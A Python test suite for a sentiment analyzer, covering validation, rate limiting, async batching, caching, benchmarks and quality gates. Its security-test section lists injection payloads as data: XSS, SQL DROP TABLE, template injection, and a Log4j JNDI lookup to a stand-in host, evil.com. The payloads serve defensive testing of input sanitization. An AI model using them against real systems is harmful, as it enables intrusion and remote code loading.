"""
Comprehensive Test Suite for Sentiment Analyzer

Tests all three generations of the sentiment analyzer with extensive coverage:
- Unit tests for core functionality
- Integration tests for system components
- Performance benchmarking
- Security testing
- Edge case validation
"""

import pytest
import asyncio
import time
import json
import threading
from typing import List, Dict, Any
from unittest.mock import Mock, patch
import numpy as np

# Import all analyzer generations
try:
    from sentiment_analyzer import SentimentEvolutionHub, SentimentLabel, quick_sentiment_analysis
    GENERATION_1_AVAILABLE = True
except ImportError as e:
    print(f"Generation 1 not available: {e}")
    GENERATION_1_AVAILABLE = False

try:
    from robust_sentiment_analyzer import RobustSentimentAnalyzer, ValidationError, ProcessingError
    GENERATION_2_AVAILABLE = True
except ImportError as e:
    print(f"Generation 2 not available: {e}")
    GENERATION_2_AVAILABLE = False

try:
    from scalable_sentiment_analyzer import ScalableSentimentAnalyzer
    GENERATION_3_AVAILABLE = True
except ImportError as e:
    print(f"Generation 3 not available: {e}")
    GENERATION_3_AVAILABLE = False

class TestResults:
    """Test results aggregator"""
    
    def __init__(self):
        self.results = {
            "generation_1": {"passed": 0, "failed": 0, "errors": []},
            "generation_2": {"passed": 0, "failed": 0, "errors": []},
            "generation_3": {"passed": 0, "failed": 0, "errors": []},
            "performance": {"benchmarks": {}, "errors": []},
            "security": {"passed": 0, "failed": 0, "errors": []},
            "summary": {}
        }
    
    def add_result(self, category: str, test_name: str, passed: bool, error: str = None):
        """Add test result"""
        if passed:
            self.results[category]["passed"] += 1
        else:
            self.results[category]["failed"] += 1
            if error:
                self.results[category]["errors"].append(f"{test_name}: {error}")
    
    def add_benchmark(self, test_name: str, metrics: Dict[str, Any]):
        """Add performance benchmark"""
        self.results["performance"]["benchmarks"][test_name] = metrics
    
    def get_summary(self) -> Dict[str, Any]:
        """Generate comprehensive summary"""
        total_passed = sum(cat.get("passed", 0) for cat in self.results.values() if isinstance(cat, dict))
        total_failed = sum(cat.get("failed", 0) for cat in self.results.values() if isinstance(cat, dict))
        
        self.results["summary"] = {
            "total_tests": total_passed + total_failed,
            "total_passed": total_passed,
            "total_failed": total_failed,
            "success_rate": total_passed / max(total_passed + total_failed, 1),
            "generations_available": {
                "generation_1": GENERATION_1_AVAILABLE,
                "generation_2": GENERATION_2_AVAILABLE,
                "generation_3": GENERATION_3_AVAILABLE
            }
        }
        
        return self.results

# Test data
TEST_CASES = [
    ("I love this product, it's amazing!", SentimentLabel.POSITIVE),
    ("This is terrible, worst experience ever", SentimentLabel.NEGATIVE),
    ("It's okay, nothing special", SentimentLabel.NEUTRAL),
    ("Absolutely fantastic service!", SentimentLabel.POSITIVE),
    ("I hate waiting in long lines", SentimentLabel.NEGATIVE),
    ("The weather is fine today", SentimentLabel.NEUTRAL),
    ("Outstanding quality and perfect delivery", SentimentLabel.POSITIVE),
    ("Poor customer support, very disappointing", SentimentLabel.NEGATIVE),
    ("Average product, meets basic expectations", SentimentLabel.NEUTRAL),
    ("Incredible value for money, highly recommend!", SentimentLabel.POSITIVE),
]

EDGE_CASES = [
    "",  # Empty string
    " ",  # Whitespace only
    "a",  # Single character
    "A" * 1000,  # Very long string
    "🙂😊😃",  # Emojis only
    "This is a test. " * 100,  # Repetitive text
    "Mixed 😊 emotions 😢 here",  # Mixed with emojis
    "12345 67890 numbers only",  # Numbers
    "Special chars: !@#$%^&*()",  # Special characters
    "UPPERCASE TEXT ONLY",  # All caps
]

class TestGeneration1:
    """Test Generation 1: Basic sentiment analysis"""
    
    def test_basic_initialization(self, results: TestResults):
        """Test basic analyzer initialization"""
        if not GENERATION_1_AVAILABLE:
            results.add_result("generation_1", "initialization", False, "Generation 1 not available")
            return
            
        try:
            analyzer = SentimentEvolutionHub()
            assert analyzer is not None
            assert len(analyzer.population) > 0
            results.add_result("generation_1", "initialization", True)
        except Exception as e:
            results.add_result("generation_1", "initialization", False, str(e))
    
    def test_single_analysis(self, results: TestResults):
        """Test single text analysis"""
        if not GENERATION_1_AVAILABLE:
            results.add_result("generation_1", "single_analysis", False, "Generation 1 not available")
            return
            
        try:
            analyzer = SentimentEvolutionHub()
            
            for text, expected_label in TEST_CASES[:5]:  # Test subset
                result = analyzer.analyze_sentiment(text)
                
                assert result is not None
                assert hasattr(result, 'label')
                assert hasattr(result, 'confidence')
                assert isinstance(result.confidence, float)
                assert 0.0 <= result.confidence <= 1.0
                assert result.label in SentimentLabel
            
            results.add_result("generation_1", "single_analysis", True)
            
        except Exception as e:
            results.add_result("generation_1", "single_analysis", False, str(e))
    
    def test_batch_analysis(self, results: TestResults):
        """Test batch analysis functionality"""
        if not GENERATION_1_AVAILABLE:
            results.add_result("generation_1", "batch_analysis", False, "Generation 1 not available")
            return
            
        try:
            analyzer = SentimentEvolutionHub()
            texts = [case[0] for case in TEST_CASES]
            
            results_list = analyzer.batch_analyze(texts)
            
            assert len(results_list) == len(texts)
            for result in results_list:
                assert result is not None
                assert hasattr(result, 'label')
                assert hasattr(result, 'confidence')
            
            results.add_result("generation_1", "batch_analysis", True)
            
        except Exception as e:
            results.add_result("generation_1", "batch_analysis", False, str(e))
    
    def test_evolution(self, results: TestResults):
        """Test evolutionary algorithm"""
        if not GENERATION_1_AVAILABLE:
            results.add_result("generation_1", "evolution", False, "Generation 1 not available")
            return
            
        try:
            analyzer = SentimentEvolutionHub()
            initial_generation = analyzer.generation
            initial_fitness = max(p.fitness_score for p in analyzer.population)
            
            # Run evolution with test cases
            test_data = [(case[0], case[1]) for case in TEST_CASES]
            analyzer.evolve_generation(test_data)
            
            # Check evolution occurred
            assert analyzer.generation > initial_generation
            final_fitness = max(p.fitness_score for p in analyzer.population)
            
            # Fitness should generally improve (allow some variance)
            assert final_fitness >= initial_fitness * 0.9
            
            results.add_result("generation_1", "evolution", True)
            
        except Exception as e:
            results.add_result("generation_1", "evolution", False, str(e))

class TestGeneration2:
    """Test Generation 2: Robust error handling"""
    
    def test_robust_initialization(self, results: TestResults):
        """Test robust analyzer initialization"""
        if not GENERATION_2_AVAILABLE:
            results.add_result("generation_2", "initialization", False, "Generation 2 not available")
            return
            
        try:
            analyzer = RobustSentimentAnalyzer()
            assert analyzer is not None
            assert analyzer.validator is not None
            assert analyzer.rate_limiter is not None
            
            health = analyzer.get_health_status()
            assert "status" in health
            
            results.add_result("generation_2", "initialization", True)
            
        except Exception as e:
            results.add_result("generation_2", "initialization", False, str(e))
    
    def test_input_validation(self, results: TestResults):
        """Test input validation and sanitization"""
        if not GENERATION_2_AVAILABLE:
            results.add_result("generation_2", "validation", False, "Generation 2 not available")
            return
            
        try:
            analyzer = RobustSentimentAnalyzer()
            
            # Test valid inputs
            for text, _ in TEST_CASES[:3]:
                result = analyzer.analyze_sentiment(text)
                assert result.error_details is None
            
            # Test edge cases
            for edge_case in EDGE_CASES:
                try:
                    result = analyzer.analyze_sentiment(edge_case, enable_rate_limit=False)
                    # Should either succeed or fail gracefully
                    if result.error_details:
                        assert result.label == SentimentLabel.UNKNOWN
                except (ValidationError, ProcessingError):
                    # Expected for some edge cases
                    pass
            
            results.add_result("generation_2", "validation", True)
            
        except Exception as e:
            results.add_result("generation_2", "validation", False, str(e))
    
    def test_error_handling(self, results: TestResults):
        """Test comprehensive error handling"""
        if not GENERATION_2_AVAILABLE:
            results.add_result("generation_2", "error_handling", False, "Generation 2 not available")
            return
            
        try:
            analyzer = RobustSentimentAnalyzer()
            
            # Test invalid inputs
            invalid_inputs = [None, 123, [], {}]
            
            for invalid_input in invalid_inputs:
                try:
                    result = analyzer.analyze_sentiment(invalid_input, enable_rate_limit=False)
                    if result.error_details:
                        assert result.label == SentimentLabel.UNKNOWN
                except ValidationError:
                    # Expected for invalid inputs
                    pass
            
            results.add_result("generation_2", "error_handling", True)
            
        except Exception as e:
            results.add_result("generation_2", "error_handling", False, str(e))
    
    def test_rate_limiting(self, results: TestResults):
        """Test rate limiting functionality"""
        if not GENERATION_2_AVAILABLE:
            results.add_result("generation_2", "rate_limiting", False, "Generation 2 not available")
            return
            
        try:
            # Create analyzer with very low rate limit for testing
            analyzer = RobustSentimentAnalyzer(rate_limit_rpm=3)
            
            client_id = "test_rate_limit_client"
            
            # First few requests should succeed
            for i in range(3):
                result = analyzer.analyze_sentiment("Test text", client_id=client_id)
                assert result.error_details is None
            
            # Next request should be rate limited
            try:
                analyzer.analyze_sentiment("Test text", client_id=client_id)
                # If no exception, check if result indicates rate limit
            except Exception as e:
                assert "rate limit" in str(e).lower()
            
            results.add_result("generation_2", "rate_limiting", True)
            
        except Exception as e:
            results.add_result("generation_2", "rate_limiting", False, str(e))
    
    def test_batch_error_handling(self, results: TestResults):
        """Test batch processing error handling"""
        if not GENERATION_2_AVAILABLE:
            results.add_result("generation_2", "batch_error_handling", False, "Generation 2 not available")
            return
            
        try:
            analyzer = RobustSentimentAnalyzer()
            
            # Mix of valid and invalid inputs
            mixed_inputs = [
                "Valid text 1",
                "",  # Invalid - empty
                "Valid text 2",
                None,  # Invalid - None
                "Valid text 3"
            ]
            
            # Test with fail_fast=False (should handle errors gracefully)
            results_list = analyzer.batch_analyze(mixed_inputs, fail_fast=False, client_id="test_batch")
            
            assert len(results_list) == len(mixed_inputs)
            
            # Check that we have both successful and error results
            success_count = sum(1 for r in results_list if r.error_details is None)
            error_count = sum(1 for r in results_list if r.error_details is not None)
            
            assert success_count > 0  # Should have some successes
            assert error_count > 0    # Should have some errors
            
            results.add_result("generation_2", "batch_error_handling", True)
            
        except Exception as e:
            results.add_result("generation_2", "batch_error_handling", False, str(e))

class TestGeneration3:
    """Test Generation 3: Performance and scaling"""
    
    def test_scalable_initialization(self, results: TestResults):
        """Test scalable analyzer initialization"""
        if not GENERATION_3_AVAILABLE:
            results.add_result("generation_3", "initialization", False, "Generation 3 not available")
            return
            
        try:
            analyzer = ScalableSentimentAnalyzer(
                cache_size=1000,
                min_workers=2,
                max_workers=4
            )
            assert analyzer is not None
            assert analyzer.cache is not None
            assert analyzer.worker_pool is not None
            
            metrics = analyzer.get_performance_metrics()
            assert metrics is not None
            
            results.add_result("generation_3", "initialization", True)
            
        except Exception as e:
            results.add_result("generation_3", "initialization", False, str(e))
    
    async def test_async_analysis(self, results: TestResults):
        """Test async sentiment analysis"""
        if not GENERATION_3_AVAILABLE:
            results.add_result("generation_3", "async_analysis", False, "Generation 3 not available")
            return
            
        try:
            analyzer = ScalableSentimentAnalyzer()
            
            # Test single async analysis
            result = await analyzer.analyze_sentiment("Test text for async")
            assert result is not None
            assert "label" in result or result.get("error")
            
            results.add_result("generation_3", "async_analysis", True)
            
        except Exception as e:
            results.add_result("generation_3", "async_analysis", False, str(e))
    
    async def test_concurrent_processing(self, results: TestResults):
        """Test concurrent processing capabilities"""
        if not GENERATION_3_AVAILABLE:
            results.add_result("generation_3", "concurrent_processing", False, "Generation 3 not available")
            return
            
        try:
            analyzer = ScalableSentimentAnalyzer()
            
            # Create multiple concurrent tasks
            texts = [f"Test text {i}" for i in range(20)]
            
            start_time = time.time()
            tasks = [analyzer.analyze_sentiment(text) for text in texts]
            results_list = await asyncio.gather(*tasks, return_exceptions=True)
            processing_time = time.time() - start_time
            
            # Check results
            successful_results = [r for r in results_list if not isinstance(r, Exception)]
            assert len(successful_results) > 0
            
            # Should be faster than sequential processing (rough check)
            # Allowing for setup overhead
            assert processing_time < len(texts) * 0.1  # Should be much faster than 0.1s per item
            
            results.add_result("generation_3", "concurrent_processing", True)
            
        except Exception as e:
            results.add_result("generation_3", "concurrent_processing", False, str(e))
    
    async def test_batch_processing(self, results: TestResults):
        """Test high-performance batch processing"""
        if not GENERATION_3_AVAILABLE:
            results.add_result("generation_3", "batch_processing", False, "Generation 3 not available")
            return
            
        try:
            analyzer = ScalableSentimentAnalyzer()
            
            texts = [case[0] for case in TEST_CASES] * 5  # 50 texts
            
            start_time = time.time()
            batch_results = await analyzer.batch_analyze(texts, batch_size=10, max_concurrency=5)
            batch_time = time.time() - start_time
            
            assert len(batch_results) == len(texts)
            
            # Check that at least most analyses succeeded
            successful_count = sum(1 for r in batch_results if not r.get("error"))
            assert successful_count >= len(texts) * 0.8  # At least 80% success
            
            results.add_result("generation_3", "batch_processing", True)
            
        except Exception as e:
            results.add_result("generation_3", "batch_processing", False, str(e))
    
    def test_caching(self, results: TestResults):
        """Test caching functionality"""
        if not GENERATION_3_AVAILABLE:
            results.add_result("generation_3", "caching", False, "Generation 3 not available")
            return
            
        try:
            analyzer = ScalableSentimentAnalyzer(cache_size=100)
            
            test_text = "This is a test for caching functionality"
            
            # First analysis (should be cached)
            result1 = analyzer.analyze_sentiment_sync(test_text)
            assert not result1.get("from_cache", False)
            
            # Second analysis (should come from cache)
            result2 = analyzer.analyze_sentiment_sync(test_text)
            assert result2.get("from_cache", False)
            
            # Results should be consistent
            if "error" not in result1 and "error" not in result2:
                assert result1["label"] == result2["label"]
            
            # Check cache stats
            cache_stats = analyzer.cache.stats
            assert cache_stats.hits > 0
            
            results.add_result("generation_3", "caching", True)
            
        except Exception as e:
            results.add_result("generation_3", "caching", False, str(e))
    
    def test_performance_monitoring(self, results: TestResults):
        """Test performance monitoring and metrics"""
        if not GENERATION_3_AVAILABLE:
            results.add_result("generation_3", "monitoring", False, "Generation 3 not available")
            return
            
        try:
            analyzer = ScalableSentimentAnalyzer()
            
            # Generate some activity
            for i in range(10):
                analyzer.analyze_sentiment_sync(f"Test text {i}")
            
            # Check metrics
            metrics = analyzer.get_performance_metrics()
            assert metrics.throughput_per_second >= 0
            assert metrics.memory_usage_mb > 0
            assert metrics.cache_stats.hits + metrics.cache_stats.misses > 0
            
            # Check health status
            health = analyzer.health_check()
            assert "status" in health
            assert health["status"] in ["healthy", "degraded", "unhealthy"]
            assert "health_score" in health
            assert 0 <= health["health_score"] <= 100
            
            results.add_result("generation_3", "monitoring", True)
            
        except Exception as e:
            results.add_result("generation_3", "monitoring", False, str(e))

class SecurityTests:
    """Security and safety tests"""
    
    def test_injection_prevention(self, results: TestResults):
        """Test protection against injection attacks"""
        if not GENERATION_2_AVAILABLE:
            results.add_result("security", "injection_prevention", False, "Generation 2 not available")
            return
            
        try:
            analyzer = RobustSentimentAnalyzer()
            
            # Test potential injection attempts
            malicious_inputs = [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "eval('malicious code')",
                "'; DROP TABLE users; --",
                "{{7*7}}",  # Template injection
                "${jndi:ldap://evil.com/a}",  # Log4j style
            ]
            
            for malicious_input in malicious_inputs:
                try:
                    result = analyzer.analyze_sentiment(malicious_input, enable_rate_limit=False)
                    # Should either reject the input or sanitize it
                    if result.validation_result:
                        # Input should be flagged or sanitized
                        if not result.validation_result.is_valid:
                            # Good - rejected malicious input
                            continue
                        elif result.validation_result.sanitized_text != malicious_input:
                            # Good - sanitized the input
                            continue
                    
                    # If processing succeeded, ensure no code execution
                    # (In a real scenario, we'd check logs for injection attempts)
                    assert result.label in SentimentLabel or result.error_details
                    
                except ValidationError:
                    # Good - rejected malicious input
                    pass
            
            results.add_result("security", "injection_prevention", True)
            
        except Exception as e:
            results.add_result("security", "injection_prevention", False, str(e))
    
    def test_resource_limits(self, results: TestResults):
        """Test resource limit enforcement"""
        if not GENERATION_2_AVAILABLE:
            results.add_result("security", "resource_limits", False, "Generation 2 not available")
            return
            
        try:
            analyzer = RobustSentimentAnalyzer(max_text_length=1000)
            
            # Test length limits
            very_long_text = "A" * 50000  # Much longer than limit
            
            try:
                result = analyzer.analyze_sentiment(very_long_text, enable_rate_limit=False)
                # Should either truncate or reject
                if result.validation_result:
                    if not result.validation_result.is_valid:
                        # Good - rejected overly long input
                        pass
                    elif result.validation_result.warnings:
                        # Good - truncated with warning
                        pass
            except ValidationError:
                # Good - rejected long input
                pass
            
            results.add_result("security", "resource_limits", True)
            
        except Exception as e:
            results.add_result("security", "resource_limits", False, str(e))

class PerformanceBenchmarks:
    """Performance benchmarking"""
    
    async def benchmark_throughput(self, results: TestResults):
        """Benchmark processing throughput"""
        benchmarks = {}
        
        # Generation 1 benchmark
        if GENERATION_1_AVAILABLE:
            try:
                analyzer = SentimentEvolutionHub()
                texts = [case[0] for case in TEST_CASES] * 10  # 100 texts
                
                start_time = time.time()
                for text in texts:
                    analyzer.analyze_sentiment(text)
                gen1_time = time.time() - start_time
                
                benchmarks["generation_1_sequential"] = {
                    "texts_processed": len(texts),
                    "total_time": gen1_time,
                    "throughput_per_second": len(texts) / gen1_time
                }
                
            except Exception as e:
                benchmarks["generation_1_sequential"] = {"error": str(e)}
        
        # Generation 3 benchmark (async)
        if GENERATION_3_AVAILABLE:
            try:
                analyzer = ScalableSentimentAnalyzer()
                texts = [case[0] for case in TEST_CASES] * 20  # 200 texts
                
                start_time = time.time()
                batch_results = await analyzer.batch_analyze(texts[:100], max_concurrency=10)
                gen3_batch_time = time.time() - start_time
                
                benchmarks["generation_3_batch"] = {
                    "texts_processed": len(batch_results),
                    "total_time": gen3_batch_time,
                    "throughput_per_second": len(batch_results) / gen3_batch_time,
                    "success_rate": sum(1 for r in batch_results if not r.get("error")) / len(batch_results)
                }
                
                # Concurrent processing benchmark
                start_time = time.time()
                tasks = [analyzer.analyze_sentiment(text) for text in texts[:50]]
                concurrent_results = await asyncio.gather(*tasks, return_exceptions=True)
                gen3_concurrent_time = time.time() - start_time
                
                successful_concurrent = [r for r in concurrent_results if not isinstance(r, Exception)]
                
                benchmarks["generation_3_concurrent"] = {
                    "texts_processed": len(successful_concurrent),
                    "total_time": gen3_concurrent_time,
                    "throughput_per_second": len(successful_concurrent) / gen3_concurrent_time,
                    "success_rate": len(successful_concurrent) / len(concurrent_results)
                }
                
            except Exception as e:
                benchmarks["generation_3_batch"] = {"error": str(e)}
                benchmarks["generation_3_concurrent"] = {"error": str(e)}
        
        results.results["performance"]["benchmarks"] = benchmarks

# Main test runner
async def run_all_tests():
    """Run comprehensive test suite"""
    
    print("🧪 Starting Comprehensive Sentiment Analyzer Test Suite")
    print("=" * 60)
    
    results = TestResults()
    
    # Generation 1 Tests
    print("\n📊 Testing Generation 1: Basic Functionality")
    gen1_tests = TestGeneration1()
    gen1_tests.test_basic_initialization(results)
    gen1_tests.test_single_analysis(results)
    gen1_tests.test_batch_analysis(results)
    gen1_tests.test_evolution(results)
    
    # Generation 2 Tests  
    print("\n🛡️ Testing Generation 2: Robust Error Handling")
    gen2_tests = TestGeneration2()
    gen2_tests.test_robust_initialization(results)
    gen2_tests.test_input_validation(results)
    gen2_tests.test_error_handling(results)
    gen2_tests.test_rate_limiting(results)
    gen2_tests.test_batch_error_handling(results)
    
    # Generation 3 Tests
    print("\n⚡ Testing Generation 3: Performance & Scaling")
    gen3_tests = TestGeneration3()
    gen3_tests.test_scalable_initialization(results)
    await gen3_tests.test_async_analysis(results)
    await gen3_tests.test_concurrent_processing(results)
    await gen3_tests.test_batch_processing(results)
    gen3_tests.test_caching(results)
    gen3_tests.test_performance_monitoring(results)
    
    # Security Tests
    print("\n🔒 Testing Security Features")
    security_tests = SecurityTests()
    security_tests.test_injection_prevention(results)
    security_tests.test_resource_limits(results)
    
    # Performance Benchmarks
    print("\n🏆 Running Performance Benchmarks")
    benchmark_tests = PerformanceBenchmarks()
    await benchmark_tests.benchmark_throughput(results)
    
    # Generate final results
    final_results = results.get_summary()
    
    print("\n" + "=" * 60)
    print("📈 TEST RESULTS SUMMARY")
    print("=" * 60)
    
    for category in ["generation_1", "generation_2", "generation_3", "security"]:
        if category in final_results:
            cat_data = final_results[category]
            total_tests = cat_data["passed"] + cat_data["failed"]
            success_rate = cat_data["passed"] / max(total_tests, 1) * 100
            
            status_emoji = "✅" if success_rate >= 80 else "⚠️" if success_rate >= 60 else "❌"
            print(f"{status_emoji} {category.replace('_', ' ').title()}: "
                  f"{cat_data['passed']}/{total_tests} passed ({success_rate:.1f}%)")
            
            if cat_data["errors"]:
                print(f"   Errors: {len(cat_data['errors'])}")
                for error in cat_data["errors"][:3]:  # Show first 3 errors
                    print(f"   - {error}")
                if len(cat_data["errors"]) > 3:
                    print(f"   ... and {len(cat_data['errors']) - 3} more")
    
    # Performance summary
    if "benchmarks" in final_results["performance"]:
        print(f"\n🏆 Performance Benchmarks:")
        for test_name, metrics in final_results["performance"]["benchmarks"].items():
            if "error" not in metrics:
                throughput = metrics.get("throughput_per_second", 0)
                print(f"   {test_name}: {throughput:.1f} texts/second")
            else:
                print(f"   {test_name}: Error - {metrics['error']}")
    
    # Overall summary
    summary = final_results["summary"]
    overall_success = summary["success_rate"] * 100
    overall_emoji = "🎉" if overall_success >= 90 else "✅" if overall_success >= 70 else "⚠️" if overall_success >= 50 else "❌"
    
    print(f"\n{overall_emoji} OVERALL RESULTS: {summary['total_passed']}/{summary['total_tests']} "
          f"tests passed ({overall_success:.1f}%)")
    
    # Save detailed results
    with open("test_results_comprehensive.json", "w") as f:
        json.dump(final_results, f, indent=2, default=str)
    
    print(f"\n📄 Detailed results saved to: test_results_comprehensive.json")
    
    return final_results

# Quality gates
def check_quality_gates(test_results: Dict[str, Any]) -> bool:
    """Check if quality gates pass"""
    
    gates = {
        "overall_success_rate": 0.85,  # 85% of tests must pass
        "generation_1_success_rate": 0.80,  # Core functionality
        "generation_2_success_rate": 0.85,  # Robustness critical
        "generation_3_success_rate": 0.75,  # Performance can be more lenient
        "security_success_rate": 0.90,  # Security is critical
        "min_throughput": 10.0,  # Minimum 10 texts/second
    }
    
    summary = test_results["summary"]
    overall_success = summary["success_rate"]
    
    print(f"\n🚪 QUALITY GATES CHECK")
    print("=" * 40)
    
    passed_gates = 0
    total_gates = len(gates)
    
    # Check overall success rate
    gate_passed = overall_success >= gates["overall_success_rate"]
    status = "✅ PASS" if gate_passed else "❌ FAIL"
    print(f"{status} Overall success rate: {overall_success:.1%} (required: {gates['overall_success_rate']:.1%})")
    if gate_passed:
        passed_gates += 1
    
    # Check individual generation success rates
    for gen in ["generation_1", "generation_2", "generation_3", "security"]:
        if gen in test_results:
            gen_data = test_results[gen]
            total_tests = gen_data["passed"] + gen_data["failed"]
            gen_success = gen_data["passed"] / max(total_tests, 1)
            required = gates.get(f"{gen}_success_rate", 0.8)
            
            gate_passed = gen_success >= required
            status = "✅ PASS" if gate_passed else "❌ FAIL"
            print(f"{status} {gen.replace('_', ' ').title()}: {gen_success:.1%} (required: {required:.1%})")
            if gate_passed:
                passed_gates += 1
    
    # Check performance benchmarks
    benchmarks = test_results["performance"]["benchmarks"]
    max_throughput = 0
    for test_name, metrics in benchmarks.items():
        if "error" not in metrics:
            throughput = metrics.get("throughput_per_second", 0)
            max_throughput = max(max_throughput, throughput)
    
    gate_passed = max_throughput >= gates["min_throughput"]
    status = "✅ PASS" if gate_passed else "❌ FAIL"
    print(f"{status} Max throughput: {max_throughput:.1f} texts/sec (required: {gates['min_throughput']:.1f})")
    if gate_passed:
        passed_gates += 1
    
    # Final gate result
    gates_success_rate = passed_gates / total_gates
    final_status = "🎉 ALL GATES PASSED" if gates_success_rate == 1.0 else f"⚠️ {passed_gates}/{total_gates} GATES PASSED"
    print(f"\n{final_status}")
    
    return gates_success_rate >= 0.8  # 80% of gates must pass

if __name__ == "__main__":
    # Run tests
    print("Starting comprehensive test suite...")
    
    # Run async tests
    test_results = asyncio.run(run_all_tests())
    
    # Check quality gates
    quality_passed = check_quality_gates(test_results)
    
    if quality_passed:
        print("\n🎉 Quality gates PASSED - Ready for production!")
        exit(0)
    else:
        print("\n❌ Quality gates FAILED - Needs improvement before production")
        exit(1)